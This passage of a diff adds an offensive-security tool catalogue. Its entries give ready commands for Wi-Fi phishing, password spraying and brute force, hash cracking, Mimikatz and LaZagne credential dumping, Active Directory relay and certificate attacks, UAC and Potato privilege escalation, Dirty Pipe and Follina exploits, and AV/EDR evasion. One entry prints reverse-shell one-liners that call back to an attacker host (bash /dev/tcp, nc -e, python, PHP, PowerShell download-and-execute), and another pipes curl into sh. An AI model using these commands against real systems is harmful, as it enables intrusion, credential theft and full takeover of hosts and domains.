+    real AP, brings them onto a look-alike, and serves a scenario page
+    (firmware upgrade, OAuth login, plugin update) that captures the entered
+    credential or PSK. Needs two interfaces - one AP, one deauth.
+    • wifiphisher -aI wlan0 -eI wlan1 --essid "Corp-WiFi" -p firmware-upgrade
+    • deauths clients off the real AP, brings them onto the look-alike, serves the chosen scenario page
+    • scenarios: firmware-upgrade, oauth-login, plugin_update, wifi_connect - all capture the entered credential / PSK
+    • needs two interfaces (one AP, one deauth); -kN skip deauth for a quieter run
+wireless_wifite                  - wifite - automated wireless auditing
+    wifite automates wireless auditing: it scans and sorts targets by signal,
+    then attacks the ones you pick - WPA handshake and PMKID capture, WPS PIN
+    and Pixie Dust, WEP - cracking captured hashes at the end. Saves
+    handshakes and cracked keys and resumes cleanly. The 'just audit
+    everything' front end to the aircrack/reaver/hashcat stack.
+    • wifite --kill                     scan everything, then menu-pick targets to attack
+    • wifite -i wlan0 --wpa --pmkid -c 6 -b <BSSID> --dict rockyou.txt      focus: WPA handshake + PMKID on one AP
+    • --wps --pixie WPS attacks ; --wep legacy ; -p 60 deauth pause ; --crack try cracking captured hashes at the end
+    • sorts targets by signal, saves handshakes to hs/ and cracked keys to cracked.json, resumes cleanly
+
+BRUTEFORCE ####################################################################################
+
+bruteforce_kerbrute              - kerbrute - Kerberos pre-auth user enum and password spray
+    kerbrute talks raw Kerberos pre-authentication to a domain controller to
+    enumerate valid usernames (no lockout, no 4625 event) and to
+    password-spray or brute a single user. Fast and relatively quiet; valid
+    users it finds feed AS-REP roasting and BloodHound.
+    • kerbrute userenum -d corp.local --dc <dc-ip> users.txt        valid usernames, no lockout, no 4625
+    • kerbrute passwordspray -d corp.local --dc <dc-ip> users.txt 'Winter2025!'    (--delay to pace under lockout)
+    • kerbrute bruteuser -d corp.local --dc <dc-ip> passwords.txt bob
+    • -o out.txt, -v; valid users feed GetNPUsers (AS-REP roast) and BloodHound
+bruteforce_patator               - Patator - multi-protocol modular brute-forcer
+    Patator is a modular multi-protocol brute-forcer whose strength is precise
+    result filtering - ignore responses by code, size, or matched string, so
+    only real hits show. Modules cover SSH, FTP, SMTP, HTTP, SMB, LDAP, the
+    SQL databases, zip/keystore files and more. Reach for it when hydra or
+    medusa cannot express the success condition.
+    • patator ssh_login host=10.0.0.5 user=root password=FILE0 0=rockyou.txt -x ignore:mesg='Authentication failed'
+    • modules: ssh_login ftp_login smtp_login http_fuzz dns_forward smb_login ldap_login mysql_login mssql_login oracle_login unzip_pass keystore_pass
+    • filter to the hit: -x ignore:code=401  -x ignore:size=1543  -x ignore:fgrep='invalid'  -x free=1:code=200
+    • COMBO00/00, RANGE0=1-100, --rate-limit, -t threads; the go-to when hydra/medusa can't express the check
+bruteforce_wordlist_gen          - wordlist generation - dictionary.py, crunch, cewl
+    Wordlist generation: cewl scrapes candidate words from the target's own
+    website, crunch produces exhaustive pattern-based lists, cupp builds a
+    personalised list from someone's details, and rule-based mutation adds
+    leet, case, years and affixes. Trim the result to the password policy with
+    pw-inspector before spraying.
+    • cewl -d 3 -m 6 -w site.txt https://target.com            harvest words from the site (add --with-numbers, -e emails)
+    • crunch 8 8 -t Summer%%%% -o out.txt                     pattern: %=digit @=lower ,=upper ^=symbol
+    • dictionary.py / hashcat rules: mutate a base list with leet, case, years and affixes to the target policy
+    • cupp -i interactive personal wordlist; then trim with pw-inspector to the policy
+bruteforce_crowbar               - Crowbar - RDP / OpenVPN / SSH-key brute force
+    Crowbar handles the online brute-force cases hydra and medusa do badly -
+    RDP (including NLA), SSH private keys tested many-keys-by-many-hosts, VNC
+    keys and OpenVPN. Point it at a CIDR and a key directory or password list.
+    Use it specifically for key-file and NLA-RDP auth.
+    • crowbar -b rdp -s 10.0.0.5/32 -u admin -C passwords.txt -n 1
+    • crowbar -b sshkey -s 10.0.0.0/24 -u root -k /path/to/keys/     test many private keys x many hosts
+    • protocols: rdp (xfreerdp), sshkey, vnckey, openvpn; -d discover open port first, -o out.log
+    • use it for the auth types hydra/medusa handle badly (key files, OpenVPN, NLA RDP)
+bruteforce_dpat                  - Domain Password Audit Tool - analyse cracked hashes
+    The Domain Password Audit Tool cross-references a cracked-hash file
+    against an NTDS dump to produce statistics for the report - percentage
+    cracked, top passwords, reuse and shared-hash clusters, and per-AD-group
+    breakdowns (e.g. how many Domain Admins cracked). Runs after secretsdump
+    and hashcat.
+    • dpat -n ntds.dit.out -c hashcat.potfile                cross-reference cracks against the NTDS dump
+    • reports: % cracked, top passwords, password reuse groups, shared-hash (same NT hash) clusters
+    • --sanitize for a client-safe report; -g groups.txt to break stats down by AD group (e.g. Domain Admins cracked)
+    • input: secretsdump 'DOMAIN/user:hash@dc' -just-dc-ntlm  ->  crack with hashcat -m 1000  ->  feed both files here
+bruteforce_hash_id               - identify hash types before cracking
+    Identifies a hash's type before you try to crack it. name-that-hash / nth
+    is the best guesser and prints the matching hashcat mode and john format;
+    hashid is the classic fallback. When unsure, try the top candidates
+    against a small wordlist and see which loads.
+    • name-that-hash -t '<hash>'    or    nth -f hashes.txt        (best guesser, shows hashcat -m and john --format)
+    • hashid -m -j '<hash>'         classic; -m prints the hashcat mode, -j the john format
+    • recognises Linux $1/$5/$6/$y crypt, NTLM, NetNTLMv1/v2, Kerberos 5 tgs/asrep, bcrypt, MySQL, app hashes
+    • when unsure, try the top 2-3 candidate modes against a small wordlist and see which loads
+bruteforce_hashcat               - hashcat - GPU password / hash cracking
+    hashcat is the GPU password cracker - hundreds of hash types,
+    straight/rule/mask/combinator/hybrid attacks, session save and restore,
+    and a persistent potfile. This module is the mode and attack reference
+    (NTLM 1000, sha512crypt 1800, WPA 22000, Kerberoast 13100, AS-REP 18200).
+    The default offline cracker when you have a GPU.
+    • hashcat -m <mode> -a <attack> hashes.txt <wordlist|mask> [-r rule]     (-m 0 MD5, 1000 NTLM, 1800 sha512crypt, 22000 WPA, 13100 Kerberoast, 18200 AS-REP)
+    • attacks: -a 0 straight (+ -r rules/best64.rule) ; -a 3 mask '?u?l?l?l?l?d?d!' ; -a 1 combinator ; -a 6/7 hybrid
+    • tuning: -O optimised, -w 3 workload, -d 1 device, --status --status-timer 10, --session job1 (+ --restore)
+    • review: hashcat -m 1000 hashes.txt --show / --left ; cracks persist in ~/.hashcat/hashcat.potfile
+    • custom charset: -1 ?l?d  then mask uses ?1 ; --increment for variable length
+bruteforce_hydra                 - Hydra - online login brute force
+    Hydra is the classic online login brute-forcer, covering SSH, FTP, RDP,
+    SMB, LDAP, SMTP, databases, VNC and HTTP forms (with a configurable
+    failure string). Fast and flexible, but online brute force triggers
+    lockouts and alerts - spray slow and wide where you can.
+    • hydra -L users.txt -P rockyou.txt ssh://10.0.0.5 -t 4 -f -o hits.txt      (-f stop on first, -t tasks)
+    • http form: hydra -l admin -P pw.txt 10.0.0.5 http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
+    • http basic: hydra -L u -P p 10.0.0.5 http-get /admin  ;  also: ftp:// rdp:// smb:// ldap3:// smtp:// mysql:// vnc://
+    • -C combos.txt (user:pass per line), -s port, -e nsr (null/user-as-pass/reversed), -V verbose
+    • warning: online brute triggers lockouts and alerts - spray slow and wide instead where possible
+bruteforce_john                  - John the Ripper - offline hash cracking
+    John the Ripper is the CPU-oriented offline cracker. Its single mode
+    (username/GECOS-based) and strong rule engine make it excellent on slow
+    hashes where GPUs help less, and the *2john helpers convert zip, rar, ssh,
+    pdf and KeePass files into crackable hashes. Autodetects most formats.
+    • john --wordlist=rockyou.txt --rules=Jumbo hashes.txt          (autodetects format; --format=NT to force)
+    • modes: --single (GECOS/username based, run it first), --incremental (brute), --mask='?u?l?l?l?l?d?d'
+    • convert: zip2john / rar2john / ssh2john / pdf2john / keepass2john / *2john  >  hash ; then run john on it
+    • john --show hashes.txt        cracked entries (from ~/.john/john.pot) ; --restore resumes a session
+    • --fork=8 CPU cores ; good CPU rules make it strong on slow hashes where GPUs help less
+bruteforce_medusa                - Medusa - parallel network login brute force
+    Medusa is a parallel network login brute-forcer similar to hydra - SSH,
+    FTP, HTTP, SMB, MSSQL, VNC, POP3/IMAP, Telnet, web forms, RDP, MySQL -
+    with stable, script-friendly output and parallelism both across hosts and
+    across logins per host. A dependable alternative when hydra misbehaves.
+    • medusa -h 10.0.0.5 -U users.txt -P rockyou.txt -M ssh -t 4 -f -O out.log
+    • -M modules: ssh, ftp, http, smbnt, mssql, vnc, pop3, imap, telnet, web-form, rdp, mysql, vmauthd, snmp
+    • -m for module options (e.g. -M http -m DIR:/admin -m FORM:user=&pass=), -H hosts.txt, -C combo file
+    • -T hosts in parallel, -t logins per host in parallel; stable and script-friendly output
+bruteforce_ncrack                - Ncrack - high-speed network auth cracking
+    Ncrack, from the Nmap project, is a high-speed network authentication
+    cracker with nmap-style target syntax and per-service tuning (connection
+    limits, delays, timing templates). Good for RDP, SSH, VNC, FTP, Telnet,
+    HTTP and databases across many hosts, with resume support.
+    • ncrack -U users.txt -P pw.txt rdp://10.0.0.5   (also ssh, ftp, telnet, http(s), vnc, smb, pop3, mssql, mysql)
+    • ncrack -p ssh,rdp,vnc 10.0.0.0/24 --user admin -P pw.txt
+    • per-service tuning: rdp://host,CL=1,cd=3000  (connection limit, delay); -T0..T5 timing templates
+    • --resume ncrack.restore ; from the Nmap project, so target syntax feels familiar
+bruteforce_pw_inspector          - pw-inspector - filter wordlists by password policy
+    pw-inspector filters a wordlist down to only the passwords a given policy
+    could accept - by length and by required character classes (lower, upper,
+    digit, special). Running it before a brute or spray removes candidates
+    that would be rejected anyway, a big speed-up. Pipe it straight into
+    hydra.
+    • pw-inspector -i rockyou.txt -o valid.txt -m 8 -M 63 -l -u -n        keep only 8-63 chars with lower+upper+digit
+    • flags: -l lowercase, -u uppercase, -n number, -p printable-others, -s special; -c N require N of the classes
+    • shrinks a giant list to only candidates the target policy could actually accept - big speed-up before brute/spray
+    • pipe it: hydra ... -P <(pw-inspector -i rockyou.txt -m 10 -u -n)
+
+EXPLOIT #######################################################################################
+
+exploit_shell_handler            - pwncat-cs / penelope - catch reverse shells and auto-upgrade them
+    pwncat-cs and penelope are upgraded reverse-shell catchers. Unlike nc
+    -lvnp they automatically upgrade the connection to a full PTY, manage
+    multiple sessions, log per session, and offer built-in upload/download and
+    privesc helpers. Use one as your listener whenever you expect a shell
+    back.
+    • pwncat-cs -lp 4444              listen; on connect it auto-upgrades to a PTY and drops to a local prompt
+    • pwncat "back" key is Ctrl-D; commands: upload / download, run privesc (enumerate/escalate), persist
+    • penelope.py 4444              multi-session handler, one-key PTY upgrade, per-session logging, "menu" to switch
+    • both handle port redirection and backgrounding far better than nc -lvnp
+exploit_tty_upgrade              - reverse-shell TTY upgrade - full interactive shell cheatsheet
+    A cheatsheet for turning a dumb reverse shell into a fully interactive
+    terminal - the python-pty spawn, the Ctrl-Z / stty raw -echo / fg dance,
+    the socat full-PTY method, and rlwrap for history with plain netcat. Fixes
+    job control, Ctrl-C, and tools like vi, less, su and ssh.
+    • python3 -c 'import pty;pty.spawn("/bin/bash")'   (or script -qc /bin/bash /dev/null)
+    • then: Ctrl-Z  ->  stty raw -echo; fg  ->  Enter Enter  ->  export TERM=xterm-256color; stty rows 50 cols 200
+    • socat: victim  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:you:443   / you  socat file:`tty`,raw,echo=0 tcp-listen:443
+    • rlwrap nc -lvnp 4444 for history/arrows when stuck with plain netcat; fixes Ctrl-C, job control, less/vi/su/ssh
+exploit_av_evasion               - payload AV/EDR evasion - ThreatCheck, obfuscation, packers
+    Techniques and tooling for getting a payload past AV/EDR - ThreatCheck to
+    binary-search the flagged bytes, string/API encryption, shellcode
+    conversion (donut), EDR-evading loaders (ScareCrow, Freeze), syscall and
+    unhooking tricks, AMSI and ETW patching. Re-test after every change;
+    encoders alone are not evasion.
+    • ThreatCheck.exe -f payload.exe -e AMSI|Defender      binary-search the flagged bytes to edit
+    • techniques: string/API encryption, sRDI shellcode, direct/indirect syscalls, sleep masking, unhooking, ETW patch
+    • loaders: donut (exe/dll -> shellcode), ScareCrow / Freeze (EDR-evading loaders), NimPlant / Nim/Rust rewrites
+    • also defeat AMSI (amsi.dll AmsiScanBuffer patch), ETW, and behavioural triggers; re-test after every change
+exploit_bloodyad                 - bloodyAD / pywhisker - Active Directory privilege escalation via ACLs
+    bloodyAD (with pywhisker) turns a specific abusable Active Directory ACL
+    edge into a single command - add a group member, force a password change,
+    grant GenericAll or DCSync rights, configure RBCD, or add a shadow
+    credential for PKINIT. The direct way to walk a BloodHound path.
+    • bloodyAD --host dc -d corp.local -u user -p pass <verb>     (add -k for Kerberos, -p :<hash> for PtH)
+    • verbs: add groupMember "GRP" user ; set password target 'New!' ; add genericAll target me ; add dcsync me ; add rbcd target me ; add uac target -f DONT_REQ_PREAUTH
+    • pywhisker -d corp.local -u user -p pass --target victim --action add    -> shadow cred (msDS-KeyCredentialLink) -> PKINIT
+    • turns a specific BloodHound ACL edge (WriteDACL, GenericWrite, ForceChangePassword, AddSelf) into one command
+exploit_mssql                    - MSSQL exploitation - impacket mssqlclient / MSSqlPwner
+    Attacks Microsoft SQL Server with impacket's mssqlclient or MSSqlPwner:
+    authenticate with Windows/Kerberos/hash, enable xp_cmdshell (or use OLE /
+    a SQL Agent job) for RCE, coerce the service account's NetNTLM with
+    xp_dirtree for relaying, and hop between instances through linked servers.
+    • mssqlclient.py 'DOMAIN/user:pass@host' -windows-auth      (or -k Kerberos, -hashes :NT)
+    • RCE: enable_xp_cmdshell ; then  xp_cmdshell whoami   (or sp_OACreate OLE, or a SQL Agent job)
+    • coerce auth: EXEC xp_dirtree '\\you\share'  ->  capture/relay the service account NetNTLM (Responder / ntlmrelayx)
+    • linked servers: enum_links ; EXEC ('xp_cmdshell whoami') AT [LINKED\SRV]  ->  hop instances; MSSqlPwner automates the chain
+exploit_oracle_odat              - odat - Oracle Database Attacking Tool
+    odat (Oracle Database Attacking Tool) automates the whole Oracle attack
+    chain - guess the SID, brute default accounts, then get OS command
+    execution and host file read/write via external tables, UTL_FILE, the
+    scheduler or Java. Run 'odat all' for a full sweep, then upload a reverse
+    shell.
+    • odat all -s <host> -p 1521                            run every check
+    • odat sidguesser / passwordguesser -s <host>          find the SID, then brute default accounts (scott/tiger, system/manager)
+    • odat externaltable -s host -d SID -U user -P pass --exec /tmp id       OS command exec
+    • odat utlfile ... --getFile / --putFile   read/write host files; dbmsscheduler / java for more exec paths; then upload a reverse shell
+exploit_printer                  - PRET - printer exploitation (PostScript / PJL / PCL) on port 9100
+    PRET talks PostScript, PJL and PCL to a network printer on port 9100,
+    giving an interactive shell to the device: dump config and stored
+    credentials, capture or read other users' print jobs, access the
+    filesystem, lock/unlock the panel, or factory-reset it. Printers are an
+    under-defended foothold and credential source.
+    • python pret.py <printer-ip> pjl        (also: ps, pcl) - interactive shell to the device
+    • pjl: ls / get config / nvram dump / lock / unlock <pin> / format ; ps: capture other users' print jobs, read files
+    • recon: nmap -p9100 --script pjl-ready-message ; hedgehog / praeda for bulk credential scraping
+    • impact: config + credential disclosure, stored-job theft, factory reset, NVRAM / firmware damage
+exploit_uac_bypass               - Windows UAC bypass - UACME and fodhelper / DLL-hijack tricks
+    Techniques for going from a medium-integrity admin to high integrity with
+    no consent prompt. UACME catalogues 70+ methods (fodhelper,
+    computerdefaults, sdclt, env-var, COM); a quick manual fodhelper registry
+    trick is included. Pick the method by Windows build and patch level - many
+    are signatured now.
+    • from medium-integrity admin to high integrity with no consent prompt
+    • Akagi.exe <method#> <payload.exe>   (UACME catalogues 70+); classics: 33 fodhelper, 34 computerdefaults, sdclt, 61 env-var, ICMLuaUtil COM
+    • quick manual fodhelper: reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd /c payload" /f && reg add ...\command /v DelegateExecute /f && fodhelper.exe
+    • pick the method by Windows build / patch level; many are signatured now
+exploit_certipy                  - Certipy / Certify - Active Directory Certificate Services attacks
+    Certipy (and the C# Certify) attacks Active Directory Certificate
+    Services. 'find -vulnerable' enumerates the ESC1-ESC16 misconfigurations;
+    the tool then requests a certificate impersonating another user,
+    authenticates with it via PKINIT to get a TGT and NT hash, or relays
+    coerced machine auth to the CA web endpoint (ESC8). A common path to
+    Domain Admin.
+    • certipy-ad find -u user@corp.local -p pass -dc-ip <ip> -vulnerable -stdout       enumerate ESC1-ESC16
+    • ESC1: certipy-ad req -u user@corp.local -p pass -ca 'CORP-CA' -template VulnTemplate -upn administrator@corp.local -dc-ip <ip>
+    • certipy-ad auth -pfx administrator.pfx -dc-ip <ip>        PKINIT -> TGT + NT hash (UnPAC-the-hash)
+    • ESC8: certipy-ad relay -target http://ca-host   (relay coerced machine auth to the CA web enrolment); Certify.exe is the on-host C# version
+exploit_coercer                  - Coercer / PetitPotam / PrinterBug - force machine authentication
+    Coercer forces a Windows machine to authenticate to a host you choose by
+    triggering every known RPC method (PetitPotam/MS-EFSR, PrinterBug/MS-RPRN,
+    DFSCoerce, ShadowCoerce). Run ntlmrelayx first: the relayed machine
+    NetNTLM becomes RBCD, a shadow credential, or an ADCS certificate, taking
+    over that host or the domain.
+    • coercer coerce -u user -p pass -d corp.local -t <target> -l <your-ip>      tries every known RPC method
+    • single triggers: petitpotam.py <you> <target> (MS-EFSR) ; printerbug.py 'corp/user:pass'@<target> <you> (MS-RPRN); dfscoerce.py; shadowcoerce
+    • run ntlmrelayx first: -t ldaps://dc --delegate-access   or   -t http://ca/certsrv/certfnsh.asp (ESC8)
+    • result: relayed machine NetNTLM -> RBCD / shadow cred / ADCS cert -> takeover that host or the domain
+exploit_lazagne                  - LaZagne - recover locally-stored credentials (post-exploitation)
+    LaZagne recovers credentials stored locally on a compromised host -
+    browsers, Wi-Fi, RDP, WinSCP/FileZilla/PuTTY, git, KeePass, Outlook, SSH
+    keys, the Windows Credential Manager and Linux keyrings - and dumps them
+    to JSON. Run it in memory to cut disk/AV footprint; scale it with a C2.
+    • lazagne.exe all -oJ           dump everything to JSON  (Linux: lazagne all ; -oN plain, -b brute masterkey)
+    • sources: browsers (saved logins/cookies), Wi-Fi, RDP/RDG, WinSCP, FileZilla, PuTTY, git, KeePass, Outlook, SSH keys, Windows Vault/Credential Manager, keyrings
+    • run in memory (execute-assembly / donut) to reduce disk/AV footprint
+    • pillage at scale by pushing it with nxc / a C2 and collecting the JSON
+exploit_potato                   - Potato family - SeImpersonate / SeAssignPrimaryToken -> SYSTEM
+    The Potato family escalates a Windows service account that holds
+    SeImpersonate or SeAssignPrimaryToken (IIS APPPOOL, MSSQL, many services)
+    to SYSTEM by coercing and stealing a privileged token. Check 'whoami
+    /priv' first, then pick the variant - PrintSpoofer, GodPotato,
+    JuicyPotatoNG, RoguePotato - by Windows build.
+    • check first: whoami /priv | findstr /i impersonate    (service accounts, IIS APPPOOL, MSSQL usually have it)
+    • PrintSpoofer64.exe -i -c cmd        (spooler up) ;  GodPotato -cmd "cmd /c whoami"   (modern, .NET 3.5-4.8, DCOM)
+    • JuicyPotatoNG / RoguePotato -r <you> -l 9999 -c '{CLSID}' ;  EfsPotato / SweetPotato when others are patched
+    • pick by Windows build: JuicyPotato <=Server2016/1809, RoguePotato/PrintSpoofer/GodPotato newer
+exploit_wesng                    - wesng - Windows Exploit Suggester NG (missing-patch -> kernel exploit)
+    Windows Exploit Suggester NG parses 'systeminfo' output offline and maps
+    the missing patches to CVEs with public exploit links, filtered by
+    exploitability and severity. Update its database first and cross-check
+    hits against the box's real build before trusting them.
+    • on target: systeminfo > sysinfo.txt   then on your box:  python wes.py sysinfo.txt -i 'Elevation of Privilege' --exploits-only
+    • wes.py --update    refresh the MS vuln DB first ; -e exploitable-only, -s severity, --hide 'edge' noise
+    • output: KB gaps mapped to CVEs with public exploit links; cross-check with the box's actual build
+exploit_ghostpack                - GhostPack - Rubeus / SafetyKatz / SharpDump / SharpWMI
+    GhostPack is a set of compiled C# offensive tools run in memory via a C2's
+    execute-assembly - Rubeus for Kerberos (roasting, ticket requests, S4U,
+    monitoring), SafetyKatz/SharpKatz for LSASS secrets, SharpDump for
+    minidumps, plus SharpUp, SharpWMI, SharpRDP and SharpHound. The modern
+    in-memory alternative to script-based tooling.
+    • run compiled or via Cobalt/Sliver execute-assembly (in memory)
+    • Rubeus.exe kerberoast /nowrap  ;  asreproast  ;  asktgt /user:u /rc4:<hash> /ptt  ;  s4u ...  ;  tgtdeleg  ;  monitor /interval:5
+    • SafetyKatz.exe / SharpKatz.exe --Command sekurlsa::logonpasswords  ;  SharpDump.exe <lsass-pid> -> minidump
+    • also SharpUp (privesc audit), SharpWMI, SharpRDP, Seatbelt, Certify, SharpHound
+exploit_linpeas                  - linPEAS - Linux local privilege-escalation enumeration
+    linPEAS is the loud, thorough Linux privesc enumerator: one script that
+    checks sudo rights, SUID/SGID, capabilities, writable cron/service/PATH,
+    credentials in files, kernel exploit hints and container/cloud metadata,
+    colour-coding the most promising findings. Read the red/yellow hits first;
+    pair with pspy to watch cron fire.
+    • curl -sL https://.../linpeas.sh | sh            (offline: scp it over, chmod +x, ./linpeas.sh -a | tee lp.txt)
+    • read the 95%/RED+YELLOW hits first: sudo -l, SUID/SGID, capabilities, writable cron/service/PATH, creds in files
+    • also: kernel exploit hints, container/cloud metadata, docker/lxc, NFS no_root_squash, SSH keys, dotfile secrets
+    • -a all checks, -s stealth/quiet, -e extra, -o pick sections; pair with pspy to watch cron actually fire
+exploit_mimikatz                 - Mimikatz - Windows credential and Kerberos ticket extraction
+    Mimikatz is the canonical Windows credential and Kerberos tool: dump
+    plaintext passwords and hashes from LSASS, read the local SAM, perform
+    DCSync, forge golden and silver tickets, and pass-the-hash. LSASS access
+    is heavily monitored, so run it in memory (Invoke-Mimikatz, SafetyKatz).
+    • privilege::debug   then   sekurlsa::logonpasswords   (also sekurlsa::ekeys / tickets / wdigest)
+    • lsadump::sam   local SAM hashes ;  lsadump::lsa /patch ;  lsadump::dcsync /user:corp\krbtgt   (DCSync, needs replication rights)
+    • kerberos::golden /user:Administrator /domain:corp.local /sid:<S-1-5-21-..> /krbtgt:<hash> /ptt   (silver = /target + service hash)
+    • sekurlsa::pth /user:u /domain:d /ntlm:<hash> /run:cmd ;  dpapi:: and vault:: for browser / cred-manager secrets
+    • defence-aware: run in memory (Invoke-Mimikatz / SafetyKatz), LSASS access is heavily monitored
+exploit_pspy                     - pspy - watch processes / cron without root
+    pspy watches process creation and file events on Linux without root,
+    revealing cron jobs, systemd timers and scripts that other users or root
+    run - with full command line and environment. Use it to catch a root-run
+    script you can modify or a wildcard/relative-path weakness. Leave it
+    running while the task fires.
+    • ./pspy64 -pf -i 1000            print process + file events, 1 s poll, no root needed
+    • reveals cron jobs, systemd timers, and scripts other users / root run - with full argv and env
+    • use it to catch a root-run script you can modify, a relative-path binary, or a tar/rsync wildcard
+    • let it run in one shell while you trigger or wait for the scheduled task in another
+exploit_winpeas                  - winPEAS - Windows local privilege-escalation enumeration
+    winPEAS is the Windows counterpart to linPEAS: it enumerates unquoted
+    service paths, weak service/registry/file ACLs, AlwaysInstallElevated,
+    modifiable scheduled tasks, DLL-hijack directories on PATH, token
+    privileges, cached credentials, autologon and more, highlighting the
+    likely wins. Confirm services with PowerUp before exploiting.
+    • winPEASx64.exe                 (quieter: winpeas.bat, or  winPEASany.exe systeminfo userinfo)
+    • flags: unquoted service paths, weak service/registry/file ACLs, AlwaysInstallElevated, modifiable scheduled tasks, DLL hijack dirs on PATH
+    • also: token privileges, cached creds, autologon, WiFi keys, PowerShell history, unattend/sysprep files, AV/AppLocker/LSA
+    • colour highlights the likely wins; cross-check services with PowerUp / SharpUp before exploiting
+exploit_basic_shell              - reverse / bind shell one-liners and TTY upgrade
+    Reverse and bind shell one-liners for bash, netcat, python, php and
+    PowerShell, with matching listener syntax and a pointer to the TTY-upgrade
+    step. The quick reference when you have code execution and need a
+    callback.
+    • bash: bash -i >& /dev/tcp/you/443 0>&1        nc: nc you 443 -e /bin/bash   (or mkfifo relay when -e is missing)
+    • python: python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("you",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
+    • php  <?php system("bash -c 'bash -i >& /dev/tcp/you/443 0>&1'");?>   ;  powershell: iex(New-Object Net.WebClient).DownloadString('http://you/rs.ps1')
+    • listener: nc -lvnp 443 (rlwrap for arrows) or  ncat --ssl -lvnp 443 ; then upgrade the TTY
+exploit_beroot                   - BeRoot - Windows/Linux privesc path checker
+    BeRoot reports likely privilege-escalation paths on Windows or Linux
+    without exploiting them - service and registry permissions, unquoted
+    paths, AlwaysInstallElevated, sudo rules, SUID, NFS, LD_PRELOAD, writable
+    /etc/passwd. Smaller and quieter than winPEAS/linPEAS; good on a monitored
+    host, then confirm with PowerUp or pspy.
+    • beRoot.exe   (Windows)  /  ./beroot   (Linux)   - reports likely privesc paths, does not exploit
+    • Windows: service/registry perms, unquoted paths, AlwaysInstallElevated, startup keys, scheduled tasks
+    • Linux: sudo rules, SUID, NFS, LD_PRELOAD/PATH, capabilities, writable /etc/passwd
+    • smaller and quieter than winPEAS/linPEAS - good on a monitored host, confirm with PowerUp/pspy
+exploit_centos_root_reset        - reset the root password on CentOS via single-user
+    The procedure for resetting the root password on a RHEL/CentOS system you
+    have console access to: interrupt GRUB, boot to a root shell via rd.break
+    or init=/bin/bash, remount /sysroot read-write, chroot and run passwd, and
+    trigger the SELinux relabel. Physical/console access only.
+    • at GRUB: e to edit the kernel line, append  rd.break  (or  init=/bin/bash), Ctrl-x to boot
+    • mount -o remount,rw /sysroot ; chroot /sysroot ; passwd root ; touch /.autorelabel ; exit ; exit  (reboot)
+    • RHEL/CentOS 7+ needs the SELinux relabel or login fails; console / physical access only
+    • same idea for other distros: init=/bin/bash then mount -o remount,rw /
+exploit_dirty_pipe               - CVE-2022-0847 Dirty Pipe local privesc
+    CVE-2022-0847: a page-cache flaw in Linux 5.8-5.16.11 that lets an
+    unprivileged user overwrite bytes in any readable file. Exploit it by
+    blanking root's password in /etc/passwd or hijacking a SUID binary's code.
+    Check uname -r; prebuilt PoCs compile on target.
+    • affects Linux 5.8 up to 5.16.11 / 5.15.25 / 5.10.102 - check: uname -r
+    • page-cache pipe flaw: an unprivileged user can overwrite bytes in any readable file
+    • exploit1: splice into /etc/passwd to blank root's password ; exploit2: hijack a SUID binary's code, run it for a root shell
+    • prebuilt PoCs (Blasty's, AndreLDM's) - compile on target: gcc exploit.c -o e && ./e /usr/bin/su
+exploit_empire                   - PowerShell Empire - post-exploitation C2
+    PowerShell Empire is a post-exploitation C2 with a client/server model (or
+    the Starkiller GUI). Set up an HTTP listener, generate a launcher
+    one-liner, then interact with agents to run shell commands, Mimikatz,
+    situational-awareness and lateral-movement modules. A module marketplace
+    and REST API for multiplayer.
+    • ./ps-empire server  +  ./ps-empire client   (or Starkiller GUI); community 5.x fork
+    • uselistener http -> set Host/Port -> execute ; usestager multi/launcher -> gives a one-liner
+    • agents: interact <name>, then  shell whoami, sysinfo, mimikatz, sherlock, portscan, psinject, steal_token
+    • module marketplace for AD recon, privesc, lateral (invoke_wmi, jenkins, ...), persistence; RESTful API for multiplayer
+exploit_follina                  - CVE-2022-30190 Follina MSDT document exploit
+    CVE-2022-30190 (Follina): a Word or RTF document fetches remote HTML that
+    returns an ms-msdt: URI, which runs PowerShell with no macros - the RTF
+    variant even fires from Explorer's preview pane. Patched mid-2022, so it
+    only lands on unpatched Office. Builders host the HTML and serve the doc.
+    • Word/RTF fetches an external HTML that returns an ms-msdt: URI which runs PowerShell - no macros
+    • builders: msdt-follina.py -c "calc.exe" -i    (hosts the HTML + serves the doc)  ;  follina.py generators on GitHub
+    • RTF variant fires from Explorer preview pane; patched June 2022 - only lands on unpatched Office
+    • pair with a payload that pulls a stager; good for phishing labs / old estates
+exploit_hoaxshell                - hoaxshell - HTTP(S) reverse shell for Windows
+    hoaxshell is an HTTP(S) reverse shell for Windows: it generates a
+    PowerShell payload that beacons with GET/POST polling and a session
+    cookie, so it blends with web traffic, needs no inbound port on the
+    target, and slips past many AV/EDR. Single session; regenerate the payload
+    if the SID rotates.
+    • python3 hoaxshell.py -s <your-ip>            (add -c for HTTPS with a self-signed cert)
+    • it prints a PowerShell payload; run that on the target, then type commands in the hoaxshell prompt
+    • beacon-style GET/POST polling with a session cookie - blends with web traffic, slips many AV/EDR
+    • no open inbound port on the target; single-session; regenerate the payload if the SID rotates
+exploit_impacket                 - Impacket - psexec, secretsdump, wmiexec and more
+    Impacket is the Python toolkit that underpins most AD attacks: remote
+    execution (psexec/smbexec/wmiexec/atexec/dcomexec), secretsdump for DCSync
+    and host secrets, GetNPUsers/GetUserSPNs for roasting, ntlmrelayx for
+    relaying, plus ticketer, getST, addcomputer and rbcd. Password, hash or
+    Kerberos auth throughout.
+    • exec: psexec.py / smbexec.py / wmiexec.py / atexec.py / dcomexec.py  'DOMAIN/user:pass@host'  (or -hashes :NT, -k Kerberos)
+    • secretsdump.py 'DOMAIN/user:pass@dc' -just-dc-ntlm       DCSync ; also dumps SAM/LSA/DPAPI on a host
+    • roast: GetNPUsers.py corp.local/ -usersfile users.txt -no-pass   (AS-REP) ;  GetUserSPNs.py corp.local/user:pass -request   (Kerberoast)
+    • ntlmrelayx.py -tf targets.txt -smb2support --delegate-access ;  also getST.py, ticketer.py, addcomputer.py, rbcd.py, mssqlclient.py, rpcdump.py
+exploit_kerberos                 - Kerberoasting, AS-REP roast and ticket attacks
+    The Kerberos attack set: Kerberoasting (request service tickets, crack
+    offline for service-account passwords), AS-REP roasting (users without
+    pre-auth), overpass-the-hash to get a TGT from an NT hash, and
+    golden/silver/diamond ticket forgery. Impacket and Rubeus implement all of
+    it.
